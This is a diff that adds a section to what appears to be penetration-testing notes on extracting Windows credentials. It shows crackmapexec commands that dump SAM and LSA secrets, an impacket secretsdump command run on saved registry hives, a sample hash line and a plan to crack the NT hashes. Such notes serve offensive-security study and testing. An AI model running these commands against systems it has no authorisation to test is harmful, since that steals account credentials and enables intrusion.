@@ -96,3 +96,24 @@ crackmapexec smb $ip --local-auth -u <username> -p <password> --sam
 
 crackmapexec smb $ip --local-auth -u <username> -p <password> --lsa
 ```
+
+
+## Extracting Credential from SAM
+
+### With secretsdump.py
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+Secretsdump dumps the local SAM hashes and would've 
+also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. 
+
+The first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database.
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+(uid:rid:lmhash:nthash)
+```
+
+Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS. Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords.
